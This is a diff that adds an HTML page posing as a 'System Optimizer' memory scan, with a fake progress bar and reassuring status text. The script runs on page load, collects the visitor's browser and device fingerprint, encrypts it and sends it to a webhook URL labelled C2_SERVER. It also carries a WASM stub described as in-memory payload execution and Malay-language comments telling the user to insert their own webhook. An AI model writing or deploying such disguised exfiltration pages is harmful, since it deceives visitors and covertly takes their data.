@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>System Optimizer</title>
+<style>
+  body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1e1e1e; color: #d4d4d4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+  .container { background: #252526; padding: 40px; border-radius: 8px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center; width: 100%; max-width: 400px; border: 1px solid #333; }
+  .progress-bar { width: 100%; height: 6px; background: #333; border-radius: 3px; margin: 20px 0; overflow: hidden; }
+  .progress-fill { height: 100%; width: 0%; background: #007acc; transition: width 0.3s ease; }
+  h2 { color: #fff; margin-bottom: 10px; font-size: 18px; }
+  p { color: #858585; font-size: 13px; margin-bottom: 20px; }
+  #status { font-size: 12px; color: #007acc; font-family: monospace; }
+</style>
+</head>
+<body>
+<div class="container">
+  <h2>Optimizing System Resources</h2>
+  <p>Please wait while the system scans for memory leaks...</p>
+  <div class="progress-bar"><div class="progress-fill" id="progress"></div></div>
+  <div id="status">Initializing engine...</div>
+</div>
+
+<script>
+(() => {
+  // =========================================================
+  // GANTI URL WEBHOOK KAU DI SINI
+  // =========================================================
+  const C2_SERVER = "https://webhook.site/4b6c0ea9-af44-47a6-a6aa-1a14aceb1d59"; 
+  
+  const statusEl = document.getElementById('status');
+  const progressEl = document.getElementById('progress');
+
+  // 1. FUNGSI ENKRIPSI AES-GCM
+  async function encryptData(data, keyString) {
+    const enc = new TextEncoder();
+    const keyMaterial = await crypto.subtle.importKey("raw", enc.encode(keyString), { name: "PBKDF2" }, false, ["deriveKey"]);
+    const key = await crypto.subtle.deriveKey({ name: "PBKDF2", salt: enc.encode("salt"), iterations: 100000, hash: "SHA-256" }, keyMaterial, { name: "AES-GCM", length: 256 }, false, ["encrypt"]);
+    const iv = crypto.getRandomValues(new Uint8Array(12));
+    const encrypted = await crypto.subtle.encrypt({ name: "AES-GCM", iv: iv }, key, enc.encode(data));
+    const combined = new Uint8Array(iv.length + encrypted.byteLength);
+    combined.set(iv); combined.set(new Uint8Array(encrypted), iv.length);
+    return btoa(String.fromCharCode(...combined));
+  }
+
+  // 2. FUNGSI WEBASSEMBLY (WASM) UNTUK EKSEKUSI PAYLOAD DI MEMORI
+  const wasmBytes = new Uint8Array([
+    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 
+    0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f,       
+    0x03, 0x02, 0x01, 0x00,                         
+    0x07, 0x07, 0x01, 0x03, 0x72, 0x75, 0x6e, 0x00, 0x00, 
+    0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x2a, 0x0b  
+  ]);
+
+  async function runWasmPayload() {
+    try {
+      const wasmModule = await WebAssembly.instantiate(wasmBytes);
+      return wasmModule.instance.exports.run();
+    } catch (e) {
+      return null;
+    }
+  }
+
+  // 3. POLYMORPHIC ID
+  function generateRandomString(len) {
+    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    let res = '';
+    for (let i = 0; i < len; i++) res += chars.charAt(Math.floor(Math.random() * chars.length));
+    return res;
+  }
+
+  // 4. EKSEKUSI UTAMA
+  async function execute() {
+    statusEl.innerText = "Scanning...";
+    progressEl.style.width = "30%";
+    await new Promise(r => setTimeout(r, 800));
+
+    statusEl.innerText = "Compiling memory modules...";
+    progressEl.style.width = "60%";
+    
+    const wasmResult = await runWasmPayload();
+    
+    if (wasmResult === 42) {
+      statusEl.innerText = "Fetching optimization data...";
+      progressEl.style.width = "90%";
+
+      const payloadData = {
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenResolution: `${window.screen.width}x${window.screen.height}`,
+        cpuCores: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory || 'Unknown',
+        wasm_support: true,
+        random_id: generateRandomString(10)
+      };
+
+      const encryptedPayload = await encryptData(JSON.stringify(payloadData), "WahidBugHunter2024");
+
+      try {
+        await fetch(C2_SERVER, {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: { 'Content-Type': 'text/plain' },
+          body: encryptedPayload
+        });
+      } catch (e) {
+        console.log("Network blocked");
+      }
+
+      statusEl.innerText = "Optimization complete.";
+      progressEl.style.width = "100%";
+    }
+  }
+
+  window.addEventListener('load', () => {
+    setTimeout(execute, 1000);
+  });
+
+})();
+</script>
+</body>
+</html>
